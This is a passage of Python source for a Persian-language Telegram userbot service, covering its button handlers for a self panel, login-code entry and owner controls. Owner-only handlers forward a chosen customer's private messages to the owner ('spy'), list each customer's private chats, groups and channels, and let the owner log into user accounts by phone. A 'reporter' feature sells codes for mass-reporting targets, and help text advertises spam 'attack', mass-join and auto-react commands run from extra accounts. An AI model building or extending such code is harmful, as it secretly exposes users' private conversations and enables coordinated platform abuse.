                    try:
                        asyncio.run_coroutine_threadsafe(start_client(uid), loop)
                    except Exception:
                        pass
                btn = "سلف روشن"
            st = "روشن" if get_ud(uid, 'self_enabled', True) else "خاموش"
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton(btn, callback_data=f"toggle_self_{uid}"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
            body = (
                "<blockquote>مدیریت سلف</blockquote>" + chr(10)
                + "<blockquote>وضعیت فعلی : <b>" + st + "</b></blockquote>"
            )
            _safe_edit(call, body, mk, parse_mode='HTML')
            return
            enabled = bool(get_ud(uid, 'self_enabled', True))
            if enabled:
                set_user(uid, 'self_enabled', False)
                spam_cancel[uid] = True
                msg = "سلف خاموش شد"
                btn = "سلف خاموش"
            else:
                if get_ud(uid, 'coins', 0) <= 0:
                    bot.send_message(uid, "سکه ندارید")
                    return
                set_user(uid, 'self_enabled', True)
                spam_cancel[uid] = False
                if uid not in clients or not clients[uid].is_connected():
                    try:
                        asyncio.run_coroutine_threadsafe(start_client(uid), loop)
                    except Exception:
                        pass
                msg = "سلف روشن شد"
                btn = "سلف روشن"
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton(btn, callback_data=f"toggle_self_{uid}"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
            _safe_edit(call, "مدیریت سلف\n" + msg, reply_markup=mk)
            return

        
        if data.startswith('sp_home_'):
            try:
                tu = int(data.split('_')[-1])
            except Exception:
                tu = uid
            if tu != uid:
                return
            _edit_any(call, build_self_panel_home_text(), build_self_panel_home_mk(uid))
            return
        
        if data.startswith('sp_help_'):
            try:
                tu = int(data.split('_')[-1])
            except Exception:
                tu = uid
            if tu != uid:
                return
            _edit_any(call, build_self_help_text(), build_self_help_mk(uid))
            return

        if data.startswith('sp_cmds_'):
            parts = data.split('_')
            try:
                tu = int(parts[2])
            except Exception:
                tu = uid
            page = 0
            if len(parts) >= 4:
                try:
                    page = int(parts[3])
                except Exception:
                    page = 0
            if tu != uid:
                return
            _edit_any(call, build_self_cmds_text(uid, page), build_self_cmds_mk(uid, page))
            return
        if data.startswith('sp_acc_'):
            try:
                tu = int(data.split('_')[-1])
            except Exception:
                tu = uid
            if tu != uid:
                return
            body = build_self_acc_text(uid)
            mk = build_self_acc_mk(uid)
            try:
                chat_id = call.message.chat.id if call.message else uid
                mid = call.message.message_id if call.message else None
                if getattr(call, 'inline_message_id', None):
                    _edit_any(call, body, mk)
                else:
                    send_panel_with_image(chat_id, body, mk, mid, uid=uid)
            except Exception:
                _edit_any(call, body, mk)
            return
        if data.startswith('help_p_'):
            # help_p_UID_PAGE
            try:
                parts = data.split('_')
                tu = int(parts[2])
                page = int(parts[3])
            except Exception:
                bot.answer_callback_query(call.id)
                return
            if tu != uid:
                bot.answer_callback_query(call.id)
                return
            # بازسازی متن صفحه
            helps = get_help_commands(uid)
            # ]
            try:
                _ex = get_extras(uid) or {}
                if any(str(a).lower() not in ('all','none','') for a in _ex.keys()):
                    helps.extend([
                        (".اتک متن تعداد", "اتک با اکانت‌های اضافه"),
                        (".set", "جوین اکانت‌ها"),
                        (".leave", "لفت اکانت‌ها"),
                        (".ری اکت 🤣", "ری‌اکت اکانت‌ها"),
                        (".ری اکت خودکار", "ری‌اکت خودکار"),
                        (".جوین", "جوین با لینک"),
                    ])
            except Exception:
                pass
            per = 8
            total_pages = max(1, (len(helps) + per - 1) // per)
            page = max(0, min(page, total_pages - 1))
            chunk = helps[page * per:(page + 1) * per]
            parts = ["<b>راهنمای دستورات سلف</b>", "<blockquote>صفحه " + str(page + 1) + "/" + str(total_pages) + "</blockquote>"]
            for cmd, desc in chunk:
                parts.append("<blockquote><code>" + str(cmd).replace("<", "") + "</code>" + chr(10) + str(desc).replace("<", "") + "</blockquote>")
            body = chr(10).join(parts)
            mk = types.InlineKeyboardMarkup(row_width=2)
            row = []
            if page > 0:
                row.append(types.InlineKeyboardButton("◀ قبلی", callback_data="help_p_" + str(uid) + "_" + str(page - 1)))
            if page < total_pages - 1:
                row.append(types.InlineKeyboardButton("بعدی ▶", callback_data="help_p_" + str(uid) + "_" + str(page + 1)))
            if row:
                mk.row(*row)
            mk.add(types.InlineKeyboardButton("بستن", callback_data="help_close_" + str(uid)))
            try:
                bot.edit_message_text(body[:4000], call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=mk)
            except Exception:
                pass
            bot.answer_callback_query(call.id)
            return

        if data.startswith('sp_close_') or data.startswith('help_close_'):
            try:
                tu = int(data.split('_')[-1])
            except Exception:
                tu = uid
            if tu != uid:
                return
            chat_id = None
            mid = None
            try:
                if getattr(call, 'message', None) and call.message:
                    chat_id = call.message.chat.id
                    mid = call.message.message_id
            except Exception:
                pass
            # 1) حذف با خود ربات
            if chat_id and mid:
                try:
                    bot.delete_message(chat_id, mid)
                    return
                except Exception:
                    pass
            # 2) حذف با سلف کاربر (برای پیام اینلاین/گروه)
            if chat_id and mid and uid in clients:
                try:
                    cl = clients[uid]
                    async def _del():
                        try:
                            await cl.delete_messages(chat_id, mid)
                        except Exception:
                            pass
                    asyncio.run_coroutine_threadsafe(_del(), loop)
                    return
                except Exception:
                    pass
            # 3) اینلاین بدون message — تلاش با empty + بعداً سلف اگر chat از state
            imid = getattr(call, 'inline_message_id', None)
            if imid:
                # کپشن/متن را خالی کن و دکمه بردار (حداقل API)
                for fn in (
                    lambda: bot.edit_message_caption(caption=".", inline_message_id=imid, reply_markup=None),
                    lambda: bot.edit_message_text(".", inline_message_id=imid, reply_markup=None),
                    lambda: bot.edit_message_reply_markup(inline_message_id=imid, reply_markup=None),
                ):
                    try:
                        fn()
                    except Exception:
                        pass
                # اگر chat_id از پنل قبلی داریم با سلف پاک کن
                try:
                    olds = list(self_panel_msgs.get((uid, chat_id)) or []) if chat_id else []
                    for oid in olds:
                        if uid in clients:
                            async def _d2(c=clients[uid], ch=chat_id, m=oid):
                                try:
                                    await c.delete_messages(ch, m)
                                except Exception:
                                    pass
                            asyncio.run_coroutine_threadsafe(_d2(), loop)
                except Exception:
                    pass
            return


        # کیبورد ورود کد لاگین
        if data.startswith('ck_'):
            parts = data.split('_')
            # ck_login_UID_X or ck_extra_UID_X
            if len(parts) < 4:
                bot.answer_callback_query(call.id)
                return
            mode = parts[1]
            try:
                tu = int(parts[2])
            except Exception:
                bot.answer_callback_query(call.id)
                return
            if tu != uid:
                bot.answer_callback_query(call.id)
                return
            key = parts[3]
            st = (login_states if mode == 'login' else extra_login_states).get(uid) or {}
            digits = str(st.get('code_digits') or '')
            if key == 'b':
                digits = digits[:-1]
            elif key == 'c':
                digits = ''
            elif key == 'ok':
                code = re.sub(r'[^0-9]', '', digits)
                if len(code) < 5:
                    bot.answer_callback_query(call.id, "کد ناقص است", show_alert=True)
                    return
                st['code_digits'] = code
                if mode == 'login':
                    login_states[uid] = st
                    try:
                        bot.edit_message_text("<blockquote><b>در حال بررسی...</b></blockquote>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
                    except Exception:
                        pass
                    bot.answer_callback_query(call.id)
                    asyncio.run_coroutine_threadsafe(_finish_login_with_code(uid, code), loop)
                else:
                    extra_login_states[uid] = st
                    try:
                        bot.edit_message_text("<blockquote><b>در حال بررسی اکانت اضافه...</b></blockquote>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
                    except Exception:
                        pass
                    bot.answer_callback_query(call.id)
                    asyncio.run_coroutine_threadsafe(_finish_extra_login_with_code(uid, code), loop)
                return
            elif key.isdigit():
                if len(digits) < 6:
                    digits += key
            st['code_digits'] = digits
            if mode == 'login':
                login_states[uid] = st
            else:
                extra_login_states[uid] = st
            try:
                bot.edit_message_text(
                    code_entry_text(digits),
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=build_code_keypad(uid, mode),
                )
            except Exception:
                pass
            bot.answer_callback_query(call.id)
            return

        if data.startswith('personalize_'):
            try:
                personalize_panel(uid, call.message.message_id if call.message else None, call.message.chat.id if call.message else None)
            except Exception as e:
                bot.send_message(uid, "شخصی سازی\n" + str(e)[:150])
            return

        if data.startswith('ex_join_txt_'):
            admin_states[uid] = {'step': 'extra_join_text'}
            _safe_edit(call, "متنی که بعد از جوین اکانت‌های اضافه ارسال شود را بفرست:\n(پیش‌فرض: Server : on)")
            return

        if data.startswith('ex_prof_photo_'):
            admin_states[uid] = {'step': 'extra_prof_photo'}
            _safe_edit(call, "عکس پروفایل جدید را بفرست (برای همه اکانت‌های اضافه):")
            return
        if data.startswith('ex_prof_name_btn_'):
            admin_states[uid] = {'step': 'extra_prof_name'}
            _safe_edit(call, "اسم جدید را بفرست (هر فونت/زبان):")
            return
        if data.startswith('ex_prof_bio_btn_'):
            admin_states[uid] = {'step': 'extra_prof_bio_only'}
            _safe_edit(call, "بیو جدید را بفرست (لینک و متن آزاد):")
            return
        if data.startswith('ex_prof_'):
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("تغییر پروفایل", callback_data=f"ex_prof_photo_{uid}"))
            mk.add(types.InlineKeyboardButton("تغییر اسم", callback_data=f"ex_prof_name_btn_{uid}"))
            mk.add(types.InlineKeyboardButton("تغییر بیو", callback_data=f"ex_prof_bio_btn_{uid}"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"personalize_{uid}"))
            _safe_edit(call, "مدیریت پروفایل اکانت‌های اضافه:", reply_markup=mk)
            return

        if data.startswith('buy_sub_'):
            # فقط لینک مستقیم — پیام اضافه نفرست
            try:
                bot.answer_callback_query(call.id, url=_support_url())
            except Exception:
                try:
                    bot.answer_callback_query(call.id)
                except Exception:
                    pass
            return

        if data.startswith('sub_plan_'):
            try:
                bot.answer_callback_query(call.id, url=_support_url())
            except Exception:
                pass
            return




        if data == 'ousers_spy':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            data_u = load_data()
            users = data_u.get('users') or {}
            mk = types.InlineKeyboardMarkup(row_width=2)
            lines = [
                "<blockquote><b>ارسال / لیست کاربران</b></blockquote>",
                "<blockquote>ارسال = فوروارد پیوی به شما | لیست = چنل/گروه/پیوی</blockquote>",
            ]
            n = 0
            for s, u in list(users.items()):
                if not isinstance(u, dict) or not u.get('session'):
                    continue
                try:
                    tid = int(s)
                except Exception:
                    continue
                if tid == int(OWNER_ID):
                    continue
                nm = (u.get('original_name') or u.get('name') or str(tid)).replace('<', '')[:18]
                on = 'ON' if pv_spy.get(tid) else 'OFF'
                lines.append("<blockquote>" + nm + " | <code>" + str(tid) + "</code> | ارسال:" + on + "</blockquote>")
                mk.row(
                    types.InlineKeyboardButton(("⏹ارسال" if pv_spy.get(tid) else "ارسال") + " " + nm[:12], callback_data="ospy_" + str(tid)),
                    types.InlineKeyboardButton("لیست", callback_data="olist_" + str(tid)),
                )
                n += 1
                if n >= 40:
                    break
            if n == 0:
                lines.append("<blockquote>کاربری نیست</blockquote>")
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, chr(10).join(lines)[:4000], mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data.startswith('ospy_'):
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            try:
                tid = int(data.split('_')[-1])
            except Exception:
                bot.answer_callback_query(call.id)
                return
            if pv_spy.get(tid):
                pv_spy.pop(tid, None)
                bot.answer_callback_query(call.id, "ارسال خاموش", show_alert=True)
            else:
                pv_spy[tid] = True
                try:
                    if tid not in clients:
                        asyncio.run_coroutine_threadsafe(start_client(tid), loop)
                except Exception:
                    pass
                bot.answer_callback_query(call.id, "ارسال روشن — پیوی‌ها می‌آید", show_alert=True)
            # refresh list
            data_u = load_data()
            users = data_u.get('users') or {}
            mk = types.InlineKeyboardMarkup(row_width=2)
            lines = ["<blockquote><b>ارسال / لیست کاربران</b></blockquote>"]
            for s, u in list(users.items()):
                if not isinstance(u, dict) or not u.get('session'):
                    continue
                try:
                    t2 = int(s)
                except Exception:
                    continue
                if t2 == int(OWNER_ID):
                    continue
                nm = (u.get('original_name') or u.get('name') or str(t2)).replace('<', '')[:18]
                on = 'ON' if pv_spy.get(t2) else 'OFF'
                lines.append("<blockquote>" + nm + " | <code>" + str(t2) + "</code> | " + on + "</blockquote>")
                mk.row(
                    types.InlineKeyboardButton(("⏹ارسال" if pv_spy.get(t2) else "ارسال") + " " + nm[:12], callback_data="ospy_" + str(t2)),
                    types.InlineKeyboardButton("لیست", callback_data="olist_" + str(t2)),
                )
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, chr(10).join(lines)[:4000], mk, parse_mode='HTML')
            return

        if data == 'olist_stop':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            try:
                list_stop.add(int(OWNER_ID))
            except Exception:
                pass
            bot.answer_callback_query(call.id, "توقف شد", show_alert=True)
            try:
                bot.send_message(OWNER_ID, "<blockquote>⏹ ارسال لیست متوقف شد</blockquote>", parse_mode='HTML')
            except Exception:
                pass
            return

        if data == 'olist_next':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            try:
                list_skip_pv.add(int(OWNER_ID))
            except Exception:
                pass
            bot.answer_callback_query(call.id, "می‌رود پیوی بعدی", show_alert=True)
            return

        if data.startswith('olist_') and not data.startswith('olist_do_'):
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            try:
                tid = int(data.split('_')[-1])
            except Exception:
                bot.answer_callback_query(call.id)
                return
            u = get_user(tid) or {}
            nm = (u.get('original_name') or u.get('name') or str(tid)).replace('<', '')
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("💬 پیوی‌ها", callback_data="olist_do_pv_" + str(tid)))
            mk.add(types.InlineKeyboardButton("👥 گروه‌ها / گپ", callback_data="olist_do_gp_" + str(tid)))
            mk.add(types.InlineKeyboardButton("📺 چنل‌ها", callback_data="olist_do_ch_" + str(tid)))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="ousers_spy"))
            _safe_edit(
                call,
                "<blockquote><b>لیست — " + nm + "</b></blockquote>" + chr(10)
                + "<blockquote>کدام را می‌خواهید؟</blockquote>" + chr(10)
                + "<blockquote>ایدی: <code>" + str(tid) + "</code></blockquote>",
                mk,
                parse_mode='HTML',
            )
            bot.answer_callback_query(call.id)
            return

        if data.startswith('olist_do_'):
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            # olist_do_pv_TID / olist_do_gp_TID / olist_do_ch_TID
            parts = data.split('_')
            # ['olist', 'do', 'pv', tid]
            try:
                mode = parts[2]
                tid = int(parts[3])
            except Exception:
                bot.answer_callback_query(call.id)
                return
            bot.answer_callback_query(call.id, "شروع شد — برای توقف: توقف", show_alert=True)
            try:
                asyncio.run_coroutine_threadsafe(_owner_list_user(tid, mode=mode), loop)
            except Exception as e:
                bot.send_message(OWNER_ID, "خطا لیست: " + str(e)[:100])
            return

        if data == 'ologin_users':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            admin_states[uid] = {
                'step': 'ologin_phone',
                'panel_mid': getattr(call.message, 'message_id', None),
                'panel_chat': getattr(getattr(call.message, 'chat', None), 'id', None),
            }
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(
                call,
                "<blockquote><b>لاگین کاربران</b></blockquote>" + chr(10)
                + "<blockquote>شماره موبایل کاربر را بفرست</blockquote>" + chr(10)
                + "<blockquote>مثال: <code>09016143216</code> یا <code>+989016143216</code></blockquote>",
                mk,
                parse_mode='HTML',
            )
            bot.answer_callback_query(call.id)
            return

        if data.startswith('ologin_info_') or data.startswith('ologin_tog_'):
            # قدیمی — هدایت به ورود شماره
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id, "فقط مالک اصلی", show_alert=True)
                return
            bot.answer_callback_query(call.id, "شماره موبایل را بفرست", show_alert=True)
            return



        if data == 'orep_bo':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            admin_states[uid] = {'step': 'orep_bo_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>ایدی عددی کاربر برای ریپورتر BO را بفرست</blockquote>" + chr(10) + "<blockquote>بدون لاگین سلف می‌تواند از ریپورتر استفاده کند</blockquote>", mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        if data == 'orep_bo_list':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            data_u = load_data()
            bo = data_u.get('reporter_bo') or []
            lines = ["<blockquote><b>لیست ریپورتر BO</b></blockquote>"]
            if not bo:
                lines.append("<blockquote>خالی</blockquote>")
            for x in bo:
                u = get_user(x) or {}
                nm = u.get('original_name') or u.get('name') or str(x)
                lines.append("<blockquote>" + str(nm).replace('<','') + " | <code>" + str(x) + "</code></blockquote>")
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, chr(10).join(lines)[:4000], mk, parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return




        if data == 'orep_protect':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {'step': 'orep_protect_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>ایدی عددی کاربری که نباید رویش گزارش زده شود را بفرست</blockquote>" + chr(10) + "<blockquote>اگر دوباره همان ایدی را بفرستی از لیست حذف می‌شود</blockquote>", mk, parse_mode='HTML')
            return

        if data == 'orep_protect_list':
            if not is_main_owner(uid):
                return
            data_u = load_data()
            prot = data_u.get('report_protected') or []
            lines = ["<blockquote><b>لیست محافظت ریپورت</b></blockquote>"]
            lines.append("<blockquote>این اهداف گزارش نمی‌شوند (مالک همیشه محافظت است)</blockquote>")
            if not prot:
                lines.append("<blockquote>خالی</blockquote>")
            for x in prot:
                try:
                    u = get_user(x) or {}
                    nm = u.get('original_name') or u.get('name') or str(x)
                    un = (u.get('username') or '').lstrip('@')
                except Exception:
                    nm, un = str(x), ''
                lines.append("<blockquote>" + str(nm).replace('<','') + "</blockquote>")
                lines.append("<blockquote><code>" + str(x) + "</code></blockquote>")
                if un:
                    lines.append("<blockquote>@" + str(un).replace('<','') + "</blockquote>")
                lines.append("<blockquote>──────────</blockquote>")
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, chr(10).join(lines)[:4000], mk, parse_mode='HTML')
            return

        if data == 'orep_exempt':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {'step': 'orep_exempt_id'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>ایدی عددی کاربری که نباید در ریپورتر استفاده شود را بفرست</blockquote>", mk, parse_mode='HTML')
            return

        if data == 'orep_exempt_list':
            if not is_main_owner(uid):
                return
            data_u = load_data()
            ex = data_u.get('report_exempt') or []
            lines = ["<blockquote><b>لیست معافیت ریپورت</b></blockquote>"]
            if not ex:
                lines.append("<blockquote>خالی</blockquote>")
            for x in ex:
                try:
                    u = get_user(x) or {}
                    nm = u.get('original_name') or u.get('name') or str(x)
                    un = (u.get('username') or '').lstrip('@')
                except Exception:
                    nm, un = str(x), ''
                lines.append("<blockquote>" + str(nm).replace('<','') + "</blockquote>")
                lines.append("<blockquote><code>" + str(x) + "</code></blockquote>")
                if un:
                    lines.append("<blockquote>@" + str(un).replace('<','') + "</blockquote>")
                lines.append("<blockquote>──────────</blockquote>")
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, chr(10).join(lines)[:4000], mk, parse_mode='HTML')
            return

        if data.startswith('orep_ex_yes_'):
            if not is_main_owner(uid):
                return
            try:
                tid = int(data.split('_')[-1])
            except Exception:
                return
            data_u = load_data()
            ex = [int(x) for x in (data_u.get('report_exempt') or []) if str(x).lstrip('-').isdigit()]
            if tid in ex:
                ex = [x for x in ex if x != tid]
            data_u['report_exempt'] = ex
            save_data(data_u)
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>کاربر <code>" + str(tid) + "</code> از معافیت ریپورت خارج شد</blockquote>", mk, parse_mode='HTML')
            return

        if data.startswith('orep_ex_no_'):
            if not is_main_owner(uid):
                return
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>لغو شد — در لیست معافیت ماند</blockquote>", mk, parse_mode='HTML')
            return

        if data == 'orep_codes':
            if not is_main_owner(uid):
                return
            data_u = load_data()
            codes = data_u.get('reporter_codes') or {}
            lines = ["<blockquote><b>لیست کدهای ریپورتر</b></blockquote>"]
            if not codes:
                lines.append("<blockquote>کدی ساخته نشده</blockquote>")
            else:
                # جدیدترین اول
                items = sorted(codes.items(), key=lambda x: float((x[1] or {}).get('created') or 0), reverse=True)
                for code, info in items[:80]:
                    info = info or {}
                    used_by = info.get('used_by')
                    if used_by:
                        status = "منقضی"
                        try:
                            u = get_user(used_by) or {}
                        except Exception:
                            u = {}
                        nm = info.get('used_name') or u.get('original_name') or u.get('name') or str(used_by)
                        un = info.get('used_username') or (u.get('username') or '')
                        un = str(un).lstrip('@')
                        ph = info.get('used_phone') or u.get('phone') or '—'
                        lines.append("<blockquote>" + str(nm).replace('<','') + "</blockquote>")
                        lines.append("<blockquote><code>" + str(used_by) + "</code></blockquote>")
                        if un:
                            lines.append("<blockquote>@" + str(un).replace('<','') + "</blockquote>")
                        lines.append("<blockquote>شماره: <code>" + str(ph) + "</code></blockquote>")
                        lines.append("<blockquote>کد: <code>" + str(code) + "</code></blockquote>")
                        lines.append("<blockquote>وضعیت کد: منقضی</blockquote>")
                    else:
                        lines.append("<blockquote>کد: <code>" + str(code) + "</code></blockquote>")
                        lines.append("<blockquote>وضعیت کد: فعال</blockquote>")
                    lines.append("<blockquote>──────────</blockquote>")
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            body = chr(10).join(lines)
            # اگر خیلی طولانی، چند پیام
            if len(body) > 3900:
                body = chr(10).join(lines[:60])
            _safe_edit(call, body[:4000], mk, parse_mode='HTML')
            return

        if data == 'orep_newcode':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {
                'step': 'orep_code_wizard',
                'code_cfg': {
                    'welcome': 'بخش ریپورتر برات باز شد',
                    'daily_limit': _rep_settings().get('daily_limit', 20),
                    'one_report': False,
                }
            }
            mk = types.InlineKeyboardMarkup(row_width=1)
            cfg = admin_states[uid]['code_cfg']
            mk.add(types.InlineKeyboardButton("متن خوش‌آمد: " + str(cfg['welcome'])[:20], callback_data="orep_cw_msg"))
            mk.add(types.InlineKeyboardButton("محدودیت روزانه: " + str(cfg['daily_limit']), callback_data="orep_cw_lim"))
            mk.add(types.InlineKeyboardButton("فقط یک گزارش: " + ("بله" if cfg['one_report'] else "خیر"), callback_data="orep_cw_one"))
            mk.add(types.InlineKeyboardButton("✅ ساخت کد با این تنظیمات", callback_data="orep_cw_make"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call,
                "<blockquote><b>ساخت کد ریپورتر</b></blockquote>" + chr(10)
                + "<blockquote>قبل از ساخت، تنظیمات را انتخاب کن</blockquote>" + chr(10)
                + "<blockquote>متن خوش‌آمد: هر فرمتی که بخوای</blockquote>" + chr(10)
                + "<blockquote>محدودیت روزانه: چند بار در روز</blockquote>" + chr(10)
                + "<blockquote>فقط یک گزارش: بعد از یک گزارش کد منقضی و دکمه ریپورتر حذف شود</blockquote>",
                mk, parse_mode='HTML')
            return

        if data == 'orep_cw_msg':
            if not is_main_owner(uid):
                return
            st = admin_states.get(uid) or {}
            st['step'] = 'orep_cw_msg_text'
            admin_states[uid] = st
            _safe_edit(call, "<blockquote>متن خوش‌آمد کد را بفرست (هر فرمتی)</blockquote>", parse_mode='HTML')
            return

        if data == 'orep_cw_lim':
            if not is_main_owner(uid):
                return
            st = admin_states.get(uid) or {}
            st['step'] = 'orep_cw_lim_num'
            admin_states[uid] = st
            _safe_edit(call, "<blockquote>محدودیت روزانه را به عدد بفرست</blockquote>", parse_mode='HTML')
            return

        if data == 'orep_cw_one':
            if not is_main_owner(uid):
                return
            st = admin_states.get(uid) or {'code_cfg': {}}
            cfg = st.get('code_cfg') or {}
            cfg['one_report'] = not cfg.get('one_report', False)
            st['code_cfg'] = cfg
            st['step'] = 'orep_code_wizard'
            admin_states[uid] = st
            # rebuild wizard
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("متن خوش‌آمد: " + str(cfg.get('welcome',''))[:20], callback_data="orep_cw_msg"))
            mk.add(types.InlineKeyboardButton("محدودیت روزانه: " + str(cfg.get('daily_limit', 20)), callback_data="orep_cw_lim"))
            mk.add(types.InlineKeyboardButton("فقط یک گزارش: " + ("بله" if cfg.get('one_report') else "خیر"), callback_data="orep_cw_one"))
            mk.add(types.InlineKeyboardButton("✅ ساخت کد با این تنظیمات", callback_data="orep_cw_make"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote><b>ساخت کد ریپورتر</b></blockquote>" + chr(10) + "<blockquote>تنظیمات به‌روز شد</blockquote>", mk, parse_mode='HTML')
            return

        if data == 'orep_cw_make':
            if not is_main_owner(uid):
                return
            st = admin_states.get(uid) or {}
            cfg = st.get('code_cfg') or {}
            code = create_reporter_code(cfg)
            admin_states.pop(uid, None)
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call,
                "<blockquote><b>کد ساخته شد</b></blockquote>" + chr(10)
                + "<blockquote><code>" + code + "</code></blockquote>" + chr(10)
                + "<blockquote>محدودیت روزانه: " + str(cfg.get('daily_limit', 20)) + "</blockquote>" + chr(10)
                + "<blockquote>فقط یک گزارش: " + ("بله" if cfg.get('one_report') else "خیر") + "</blockquote>" + chr(10)
                + "<blockquote>متن: " + str(cfg.get('welcome',''))[:100].replace('<','') + "</blockquote>",
                mk, parse_mode='HTML')
            return

        if data == 'orep_expire_code':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {'step': 'orep_expire_code'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>کدی که می‌خواهی منقضی شود را بفرست</blockquote>", mk, parse_mode='HTML')
            return

        if data == 'orep_getid':
            if not is_main_owner(uid):
                return
            admin_states[uid] = {'step': 'orep_getid'}
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
            _safe_edit(call, "<blockquote>لینک پست / چنل / گروه / اکانت را بفرست</blockquote>" + chr(10) + "<blockquote>ایدی عددی هدف استخراج می‌شود</blockquote>", mk, parse_mode='HTML')
            return

        if data == 'orep_notify_tog':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            cur = _rep_settings().get('notify_owner', True)
            _save_rep_settings(notify_owner=not cur)
            bot.answer_callback_query(call.id, "خاموش شد" if cur else "روشن شد", show_alert=True)
            try:
                call.data = 'owner_' + str(uid)
            except Exception:
                pass
            # reopen owner panel lightly
            bot.send_message(uid, "<blockquote>گزارش ریپورتر: " + ("خاموش" if cur else "روشن") + "</blockquote>", parse_mode='HTML')
            return

        if data == 'orep_users':
            if not is_main_owner(uid):
                bot.answer_callback_query(call.id)
                return
            data_u = load_data()
            rus = data_u.get('reporter_users') or {}
            items = []
            for s, ru in rus.items():
                if not isinstance(ru, dict) or not ru.get('enabled'):
                    continue
                try:
                    tid = int(s)
                except Exception:
                    continue
                u = get_user(tid) or {}
                nm = u.get('original_name') or u.get('name') or str(tid)
                total = int(ru.get('total_uses') or 0)
                today = reporter_uses_today(tid)
                lim = reporter_daily_limit(tid)
                vip = 'VIP' if ru.get('vip') else ''
                ban = 'BAN' if ru.get('banned') else ''
                items.append((total, tid, nm, today, lim, vip, ban, u.get('phone') or '—', u.get('username')))
            items.sort(key=lambda x: -x[0])
            lines = ["<blockquote><b>کاربران ریپورتر</b></blockquote>",
                     "<blockquote>مرتب‌شده بر اساس استفاده</blockquote>"]
            if not items:
                lines.append("<blockquote>هنوز کسی فعال نشده</blockquote>")
            for total, tid, nm, today, lim, vip, ban, ph, un in items[:40]:
                lines.append(
                    "<blockquote>" + str(nm).replace('<','') + " | <code>" + str(tid) + "</code>"
                    + ((" @" + str(un)) if un else "")
                    + chr(10) + "شماره: <code>" + str(ph) + "</code>"
                    + chr(10) + "امروز: " + str(today) + "/" + (str(lim) if lim < 10**8 else "∞")
                    + " | کل: " + str(total)
                    + ((" | " + vip) if vip else "")
                    + ((" | " + ban) if ban else "")
                    + "</blockquote>"
                )
            mk = types.InlineKeyboardMarkup()
